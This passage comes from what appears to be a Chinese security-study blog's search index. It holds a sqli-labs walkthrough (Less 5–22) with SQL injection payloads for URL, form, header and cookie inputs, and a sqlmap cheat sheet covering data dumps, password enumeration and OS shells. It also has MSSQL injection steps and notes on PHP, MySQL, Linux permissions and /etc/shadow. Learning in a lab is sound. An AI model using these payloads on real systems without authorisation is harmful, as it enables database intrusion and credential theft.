database()),n,1)=’s’),sleep(10),1) –+ 和布尔同理通过改变n 来确定数据库名， 正确会延迟，错误没有延迟举一反三 把里面的内容替换，如上面布尔盲注，就可找到数据 第六关（双引号字符型注入，方法与第五关相同）第七关 （8会）布尔盲注可以做第八关 id=1回显，加个单引号不回显，构造一下验证是不是布尔型payload ?id=1’ and 1=1 –+ 回显了，证明没跑了。第九关 不管怎么输入，回显总是you are . ..?id=1’ and sleep(5)–+ 发现明显延迟，说明注入成功，接下来爆破就完了第十关 基于双引号的时间盲注只要把上一题Less-9的单引号改成双引号，一样的注入，不再赘述。第十一关 是一个登陆页面，通常post传送不能在url上看到数据，只能通过抓包工具进行查看输入admin admin 登陆，抓包，发送到repeater模块 在repeater中通过修改post的参数进行注入admin’ and 1=1# 可以登录admin’ and 1=2# 不可以登录 说明注入生效，存在报错型注入，接下来又是重复性工作，上extractvalue()admin’ and extractvalue(1,concat(0x7e,(select datbase())))#也可以使用unionadmin’ order by 2#0’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #第十二关admin”) 进行注入第十三关发现登陆成功没有回显，所以可以用报错注入，时间盲注admin’) and extractvalue(1,concat(0x7e,(select database())))#admin’) and if((substr((select database()),1,1)=’s’),sleep(5),1)#第十四关 基于” 的注入（报错注入，时间盲注）同上一关第十五关 登录后没有回显 admin’ #登录成功 说明是基余’的注入用报错注入发现显示不了数据，时间延迟注入可以！第十六关 和上一关相同 admin”)#基余”)的注入第十七关 实在密码部分的注入前面用户名填admin 后面密码：admin’ and extractvalue(1,concat(0x7e,(select version())))#第十八关 我们直接在user_agent中进行测试，加入单引号后出现报错信息，根据报错信息 猜想在数据中的sql语句为：INSEERT INTO table VALUES(‘User-Agent’,’Ip’,’Username’) 三个参数通过报错注入：’,extractvalue(1,concat(0x7e,(select user()),0x7e)) ,1)#第十九关 我们抓取数据包，在referter上来做文章，先输入个单引号看下错误信息猜想在数据中的sql语句为：INSEERT INTO table VALUES(‘Referter’,’Ip’,)那我们就构造sql语句来满足insert函数这时的sql语句为INSEERT INTO table VALUES(‘1’,1)#’,’Ip’,) 两个参数采用报错注入‘,extractvalue(1,concat(0x7e,(select database()))))#第二十关 cookie注入‘ and extractvalue(1,concat(0x7e,(select database())))#第二十一关 也是cookie 但是cookie通过base64加密了‘ )and extractvalue(1,concat(0x7e,(select database())))#加密一下就好第二十二关 同上一关相同 闭合方式为’"},{"title":"sqlmap","date":"2022-03-29T03:11:36.000Z","url":"/2022/03/29/sqlmap/","categories":[[" ",""]],"content":"-u 指定目标URL (可以是http协议也可以是https协议)-d 连接数据库–dbs 列出所有的数据库–current-db 列出当前数据库–tables 列出当前的表–columns 列出当前的列-D 选择使用哪个数据库-T 选择使用哪个表-C 选择使用哪个列–dump 获取字段中的数据–batch 自动选择yes–smart 启发式快速判断，节约浪费时间–forms 尝试使用post注入-r 加载文件中的HTTP请求（本地保存的请求包txt文件）-l 加载文件中的HTTP请求（本地保存的请求包日志文件）-g 自动获取Google搜索的前一百个结果，对有GET参数的URL测试-o 开启所有默认性能优化–tamper 调用脚本进行注入-v 指定sqlmap的回显等级–delay 设置多久访问一次–os-shell 获取主机shell，一般不太好用，因为没权限-m 批量操作-c 指定配置文件，会按照该配置文件执行动作-data data指定的数据会当做post数据提交-timeout 设定超时时间-level 设置注入探测等级–risk 风险等级–identify-waf 检测防火墙类型–param-del=”分割符” 设置参数的分割符–skip-urlencode 不进行url编码–keep-alive 设置持久连接，加快探测速度–null-connection 检索没有body响应的内容，多用于盲注–thread 最大为10 设置多线程–is-dba 判断当前用户是否为管理员权限–roles 列出数据库管理员角色–users 枚举所有的用户–passwords 枚举所有的的用户密码–delay有些web服务器请求访问太过频繁可能会被防火墙拦截，使用–delay就可以设定两次http请求的延时–safe-url有的web服务器会在多次错误的访问请求后屏蔽所有请求，使用–safe-url 就可以每隔一段时间去访问一个正常的页面。-v “x” 使用sqlmap注入测试时，可以使用 -v [x] 参数来指定回显信息的复杂程度, x 的取值范围为[0~6]0 只显示python错误以及严重信息1 同时显示基本信息和警告信息2 同时显示debug信息3 同时显示注入的pyload4 同时显示HTTP请求5 同时显示HTTP相应头6 同时显示HTTP相应页面–level level有5个等级，默认等级为1，进行Cookie测试时使用–level 2 ，进行use-agent或refer测试时使用–level 3 ，进行 host 测试时使用–level 5get型step1：sqlmap -u “URL” //测试是否存在注入step2：sqlmap -u “URL” -current-db //查询当前数据库step3：sqlmap -u “URL” -D “数据库名” –tables //查询当前数据库中的所有表step4：sqlmap -u “URL” -D “数据库名” -T “表名” –columns //查询指定库中指定表的所有列(字段)step5：sqlmap -u “URL” -D “数据库名” -T “表名” -C “列名” –dump //打印出指定库中指定表指定列中的字段内容post型：先使用burp把提交的数据包保存下来或者直接加上post提交的参数 sqlmap -u “URL” –data “post参数”语法：sqlmap -r “请求包的txt文件”sqlmap -r “/root/.sqlmap/post.txt”sql-labs-less18Header injection - Uagentsqlmap 在对user-agent 注入的时候，得在文件中的user-agent的参数后面加上 *或者不加 * 号，调用 –level参数，将等级调至 3级，只有等级为 3级即以上时才能对 user-agent进行注入 语句:salmap -u “地址/ua.php&quot; –data “uname=admin&amp;passwd=admin” –user-agent=”aaa”–level 3 –dbs-batch –user-agent参数:指定想使用的UA sql-labs-less20Header injection -Cookie语法：sqlmap -u “url” –cookie “cookie信息” –level 2说明∶当需要对cookie注入的时候，必须使用–cookie选项,–data “”因为post的数据长度为0，但是又想使用post方法进行注入，则使用–data””，使用–data选项后，sqlmap自动使用post方法。sql-labs-less19Header injection - Referer对Referer注入和User-agent相同，要么是在Referer后面加上 *或者将 level 调至 3 级"},{"title":"渗透测试插件","date":"2022-03-21T02:45:59.000Z","url":"/2022/03/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8F%92%E4%BB%B6/","categories":[[" ",""]],"content":"Wappalyzer识别网站使用的技术 Chrome Firefox Netcraft ExtensionNetcraft 允许轻松查询网站有关的信息，并提供保护，防止网络钓鱼和恶意的 JavaScript ，包括病毒 Chrome Firefox BuiltWith作为Wappalyzer的有力竞争者，BuiltWith是一个网站分析工具，找到网站使用的技术 Chrome Firefox Penetration Testing Kit自动监测网站使用的框架版本号，并提供漏洞信息 Chrome Firefox ShodanShodan API，帮助发现目标Web应用的信息 Chrome Firefox MitakaOSINT搜索 Chrome Firefox 显示国家图标ChromeIP Domain Country Flag  FirefoxFlagfox  Proxy SwitchyOmega代理神器 Chrome Firefox &gt;= 55 FoxyProxy一个高级的代理管理工具 Chrome Firefox 禁用WebRTC防止 IP 泄漏ChromeWebRTC Leak Shield  FirefoxDisable WebRTC  HackBar允许测试简单的 SQL 注入和 XSS 漏洞,提供一个简单的控制台，其中包含测试任务，并允许使用 POST 或 GET 请求手动提交表单数据。其他功能包括哈希算法，加密和编码工具，SQL 注入辅助功能以及使用 XSS 有效负载测试 XSS 漏洞的功能 Chrome Firefox User-Agent Switcher and Manager修改浏览器的 User-Agent 字符串 Chrome Firefox HTTP Header Live用于查看网站的实时 HTTP 标头信息，可编辑数据并重新提交。 Chrome Firefox ModHeader添加和修改HTTP请求头和响应头 Chrome Firefox Cookie编辑ChromeEditThisCookie  FirefoxCookie-Editor  Retire.js扫描网站上有漏洞的 js 库 Chrome Firefox 快速源代码查看器ChromeQuick source viewer  FirefoxFire Source Viewer  IP Address and Domain InformationIP信息 Chrome Firefox Tampermonkey油猴脚本 Chrome Firefox NoScript Security SuiteNoScript 安全套件 Chrome Firefox Web Developer各种Web开发人员工具 Chrome Firefox Hack-Tools渗透测试工具集 Chrome Firefox Ruffle将 Flash 重新带回网络，一些 web 应用可能还在用 Flash Chrome Firefox Exif Viewer显示 JPEG 图像的 Exif 和 IPTC 数据 Chrome Firefox JSONView在浏览器中查看JSON 文件 Chrome Firefox 翻译Chrome沙拉查词 : 沙拉查词-聚合词典划词翻译/cdonnmffkdaoajfknoeeecmchibpmkmg 划词翻译 : 划词翻译/ikhdkkncnoglghljlkmcimlnlhkeamad Firefox沙拉查词 :  划词翻译 :  AdGuard广告拦截 Chrome Firefox Adblock Plus广告拦截 Chrome Firefox IE TabChrome 兼容IE插件 Chrome 建议使用 Edge 的 IE 模式： 开启方式： 设置 &gt; 默认浏览器 &gt; Internet Explorer 兼容性 &gt; 让 Internet Explorer 在 Microsoft Edge 中打开网站 : 仅不兼容的站点 ; 允许在 Internet Explorer 模式下重新加载网站 : 允许 然后重启浏览器在插件栏就可出现使用 IE 模式加载当前网页的图标"},{"title":"mysql","date":"2022-03-15T09:33:20.000Z","url":"/2022/03/15/mysql/","categories":[[" ",""]],"content":"mysql总结:常用数据类型分类 备注和说明 数据类型 说明二进制数据类型 存储非子符和文本的数据 BLOB 可用来存储图像文本数据类型 字符数据包括任意字母、符 char 固定长度的非 Unicode字符数据 号或数字字符的组合 varchar 可变长度非Unicode数据text 存储长文本信息日期和时间 日期和时间在单引号内输入 time 时间date 日期datetime 日期和时间数值型数据 该数据仅包含数字，包括正 int 整数 数、负数以及浮点数 smallintfloat 浮点数double 数值列类型·所有数值列类型的类型名及其说明和所占的字节数见下表类型名 说明 类型名 说明TINYINT 非常小的整数 BIGINT 大整数SMALLINT 较小的整数 FLOAT 单精度浮点数MEDIUMINT 中等大小的整数 DOUBLE 双精度浮点数INT 标准整数 DECIMAL 一个串的浮点数 update test_table set name=”dss” where name=”dcl”;delete from test_table where address2&gt;77;insert into test_table(name,address2) values(“sss”,152436),(“sss”,55),(“sss”,77)查询语句SELECT〈&lt;列名&gt;FROM&lt;表名&gt;[WHERE&lt;查询条件表达式&gt;][ORDER BY&lt;排序的列名&gt;[ASC或DESC] PHP访问MySQL数据库的流程第一步:连接MySQL服务器·使用mysql connect)函数建立与MySQL服务器的连接第二步:选择MySQL数据库·使用mysql_select db)函数选择MySQL数据库服务器上的数据库，并与数据库建立连接第三步:执行SQL语句·在选择的数据库中使用mysql query)函数执行SQL语句。对数据的操作方式主要包括4种方式:数据操作 说明查询数据 使用select语句实现数据的查询功能插入数据 使用insert into语句向数据库中插入数据更新数据 使用update语句修改数据库中的记录删除数据 使用delete语句删除数据库中的记录 PHP代码连接数据库服务器 mysql_connect函数!选择数据库 mysql_select_db函数;操作表(查询/插入/修改/删除 含SQL语句的mysql_query函数返回操作结果 mysql_fetch_array函数+edho等关闭数据库连接 mysql_close函数 Ms5q量本史用MSSql的基本语句:创建数据库:CREATE DATABASE [dbname]删除数据库 :drop database [dbname]创建新表:create table [tablename] ( name char(10), age tiryint, sex int )删除新表;drop table [tablename]向表中插入内容:insert into tablename values(value1,value2)删除内容:delete from [tablename] where范围更新内容:update [tablename] set field1=valuel where范围查找: select * from [tablename] where field1=” ichunqiu” MSSql手工注入的过程（利用报错注入)I1、判断注入点∶·语句:[ id=1’] [ id=1 and 1=1]返回正常 [ id=1 and 1=2]返回错误2、判断是否为MSSQL数据库:·语句: [ id=1 and exists(select * from sysobjects)]】返回正常为mssql [ id=1 and exists (select count(*) from sysobjects)]用法和上面的相同3、判断数据库版本号:·语句:[ id=1 and @@version&gt;0 ]·说明:@@version是mssql的全局变量，如果我们把它写成这样and @@version&gt;0那个后面的mssql就会强行@version强行转换成数字但是失败，所以就会将数据库信息暴露出来·版本号: nt5.2 : win2003nt6.1 : win7"},{"title":"PHP","date":"2022-03-14T03:40:24.000Z","url":"/2022/03/14/PHP/","categories":[[" ",""]],"content":"PHP大小写敏感 ·在PHP中，所有关键词（例如if、else、echo等等）和用户定义的函数名、类名均不区分大小写·但是变量名会对大小写敏感 变量规则 变量以$符号开头，其后是变量的名称变量名称必须以字母或下划线开头，而不能以数字开头变量名称只能包含字母、数字和下划线（A-z、0-9以及_)变量名称区分大小写，建议用小写PHP没有创建变量的命令，变量会在首次为其赋值时自动被创建PHP是一门类型松散的语言，在为变量赋值时，不必声明变量的数据类型，PHP会自动把变量转换为相应的数据类型 字符串 字符串要用单引号或双引号括住，字符串中可以包括html标记用单引号时，程序不会对字符串进行解析。如果字符串中包含变量，也只输出变量名，而不会输出变量值;用双引号则会对字符串进行解析。如果字符串中包含变量，则会对变量进行解析而输出变量的值;当一个字符串是纯文本组成的时候，尽量用单引号 a .= b a = a .b （连接两个字符串） 变量函数库 类型 说明 语法empty 检查变量是否为空，为空返 empty(变量) 回TRUE，否则为FALSEgettype 获取变量的类型 gettype(变量)is_array 检查变量是否为数组类型 is.array(变量)isset 检查变量是否被设置或赋值 isset(变量)unset 给定变量，即销毁变量 unset(变量)var_dump 打印变量的相关信息 var dump(变量) 表单属性● 表单METHOD属性METHOD说明本表单向服务器发送输入信息时的使用方式. 一般有两种选择:POST和GET，默认的方式是GET ● GET方法使用GET时，HTTP的客户端将表单上用户的输入信息作为字符串附加在ACTION所设定的URL后面·用“?”和“&amp;”隔开，然后把整个字符串传送到服务器端但由于系统内置变量的长度限制了输入字符串的长度，因此，用GET方式所能传送的数据长度受到限制(一般为2k字节)·注意:GET方法不具有保密性，不适合处理如信用卡卡号等要求保密的内容，而且不能传送非ASCI码的字符 表单属性 GET方法和POST方法的对比GET方式 get方式在url后面拼接参数2．只能以文本的形式传递数据3．传递的数据量小，4KB左右4、安全性低，会将数据显示在地址栏5．速度快，通常用于对安全性要求不高的请求POST方式 安全性较高2．传递数据量大，请求对数据长度没有要求3．请求不会被缓存，也不会保留在浏览器历史记录中 服务器端接收数据. PHP中有三种变量进行数据的接收$_GET·变量接受所有以get方式发送的请求，及浏览器地址栏中的?之后的内容$_POST·变量接受所有以post方式发送的请求·例如，一个form以 method=post提交，提交后php 会处理post过来的全部变量$_REQUEST·支持两种方式发送过来的请求，即post和get它都可以接受 文件访问函数:打开文件fopen()函数参数mode的可选值r以只读方式打开，如果文件不存在将出错w以写入方式打开，将文件指针指向文件头部，并删除文件内容，如果文件不存在则创建文件a以追加写入方式打开，将文件指针指向文件末尾，如果文件不存在则创建文件r+以读写方式(先读后写)打开，将文件指针指向文件头部。W+以读写方式（先写后读)打开，将文件指针指向文件头部，并删除文件内容a+以追加读写方式打开，将文件指针指向文件末尾。x以只写方式创建并打开文件，并将文件指针指向文件头。如果指定文件存在，就会打开失败X+以读写方式创建并打开文件，并将文件指针指向文件头。如果指定文件存在，就会打开失败b以二进制模式打开，可与r…w…a合用 文件访问函数∶读取文件读取文件常用函数fread0读取整个文件或文件中指定长度的字符串，可用于二进制文件读取fgets()读取文件中的一行字符fgetss()读取文件中的一行字符,并去掉所有HTML和PHP标记fgetc()读取文件中的一个字符file_get_contents()将文件读入字符串file()把文件读入到一个数组中readfile()读取一个文件，并输出到输出缓冲fread()读取整个文件或文件中指定长度的字符串，可用于二进制文件读取 文件的基本操作函数 语法 说明copy() copy(源文件,目的文件) 复制文件unlink() unlink(目标文件) 删除文件rename() rename(I日文件名,新文件名) 重命名文件或目录，或移动文件ftruncate() ftruncate(目标文件资源,截取长度) 将文件截断到指定长度file_exists() file_exists(目标文件名) 判断文件或文件夹是否存在is_file() is_file(文件名) 判断指定的路径存在且为文件 获取文件属性realpath() 返回文件的物理路径pathinfo() 以数组形式返回文件的路径和文件名信息 目录的基本操作函数 说明 示例mkdir(pathname) 新建一个指定的目录 mkdir(‘temp’)rmdiridirname) 患除目录，该目录必须为空 rmdirt (“data”)getcwd(void) 取得当前文件所在的目录 echo getcwd();chdir(dirname) 改变当前目录 chdirt(“ ../“);opendir(path) 打开目录，返回目录的指针 $dirh=opendir(‘temP’);closedir() 关闭目录，参数为目录指针 clasedir($dirh);readdir() 遍历历目录 $file=readdir($dirh)scandir(path, sort) 以数组形式遍历目录， $arr=scandir(‘D:\\ICQ’,1); sort参数可设置升序或降序排列 会话控制的概述● HTTP协议本身是无状态的● http协议无法记录用户经常上哪些网站，有什么爱好，也无法记录用户的ID帐号和密码，这就是无状态● HTTP协议本身是无状态的，客户端只需要简单的向服务器请求下载某些文件，无论足客户端还是服务器都没有必要记录彼此过去的行为，每一次请求之间都是独立的● .HTTP协议自身不具备保存之前发送过的请求或相应的功能 设置cookiePHP用setcookie函数来设置cookie Cookie在传输过程中，是HTTP协议头的一部分，用于浏览器和服务器之间传递信息所以必须在任何属于HTML文件本身的内容输出之前调用SetCookie()函数，调用该函数前不能有任何内容setcookie函数语法setcookie(namexalue.expire.p.ath.domain.secure)参数解释 参数类型 参数名 解释必填 name 设置cookie的名字value 设定cookie的值可选 expire 设定cookie的有效期，以秒为单位path 服务器端的有效路径 domain 设定有效域名secure 设定是否仅在https安全连接时才设定  (cookie seesion token 单点登录建权详解) Cookiecookie注意事项 SetCookie(之前不能有任何html输出，空格、空白行都不行 SetCookieO后，在当前页调用echo $_COOKIE[“name””]不会有输出，必须刷新或到下一个页面才可以看到Cookie值3．使用Cookie的限制，一个浏览器能创建的Cookie数量最多为30个，并且每个不能超过4KB，每个WEB站点能设置的Cookie总数不能超过20个 Cookie是保存在客户端的，如果用户禁用了Cookie，那么cookie也就失效了5. cookie的生命周期到了，cookie就会失效 设置一个cookie时失效时间为time()那么在页面浏览完之后就被删除 Session概述什么是Session ?Session译为“会话”，其本义是指有始有终的一系列动作/消息Web中的Session指的就是用户在浏览某个网站时，从进入网站到浏览器关闭所经过的这段时间，也就是用户浏览这个网站所花费的时间因此Session实际上是一个特定的时间概念，Session默认的生命周期为20分钟 Session的作用Session可以用于身份认证，程序状态记录，页面之间的参数传递等因为HTTP协议无状态，为了在服务器保持客户端的状态，就需要使用Session 总结Cookie和Session的异同点异同点Cookie Session相同 能够保存用户信息的区别不同 存储位置 存放在客户端浏览器 存放在服务器 保留时间 设定有效保存期限 关闭浏览器后自动作废 存储容量 每个浏览器只能保存某个 可以创建多个 Web服务器的最多20个cookie 但是过多会影响服务器性能 且大小不超过4KB 是否被禁用 用户设置是否开启cookie 不会被禁用，因为内容保存在服务器端 隐私策略 对客户端可见，不安全 存储在服务器，较安全 跨域支持 支持跨域名访问 不支持跨域名访问"},{"title":"Linux","date":"2022-03-14T03:39:54.000Z","url":"/2022/03/14/Linux/","categories":[[" ",""]],"content":"/etc/passwad 存储当前系统中所有的用户的信息（密码除外）/etc/shadow 存储当前系统中所有的用户的密码信息ls -l 查看文件权限 （r读w写x执行） ◆显示、 设置文件的默认权限[root@localhost ~]# umask [-S] #显示、设置文件的默认权限➢参数说明: -S以rwx形式显示新建文件的默认权限➢命令说明:●对于windows而言，默认权限是从上级目录继承而来的，而linux则是通过umask权限设定的， 如果用户建立文件，默认是没有可执行权限的,即权限表示为- rw-rw-rw-，即666●如果用户建立目录,默认权限是全开放的，即权限表示drwxrwxrwx.即777●umask的值 ，默认为022，就是需要减掉的权限，比如:建立文件时, 666-022 == 644 ,即r—-建立目录时, 777-022==755 ,即drx.-xr-x●这就是为什么我们在没有设置umask值时，默认创建的文件和目录权限分别为644和755了 . 文件权限分别为:读(read)，写(write)，执行x(execute)，简写即为(r,w,x) ，也可以可用数字来(4,2,1)表示，-即无权限 root账户不受文件权限的读写限制，执行权限受限制 用户获取文件权限的顺序:先看是否为所有者，如果是，则后面权限不看;再看是否为所属组，如果是，则后面权限不看 缺省创建的文件不可授予可执行的权限，基于最基本的安全机制，防止病毒等 test@ubuntu:~$ curL file:/ / /home/test/Desktop/baidu. txt（可以代替cat命令实现弯道访问）"},{"title":"第一篇博客","date":"2022-03-08T08:16:36.000Z","url":"/2022/03/08/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/","categories":[[" ",""]],"content":"为啥子每次在cmd中hexo g -d 有的时候链接不上服务器有的时候链接的上呢。。fatal: unable to access ‘;: OpenSSL SSL_read: Connection was reset, errno 10054 已解决：git config –global http.proxy  git config –global https.proxy 通过git代理通道加速就好啦"}]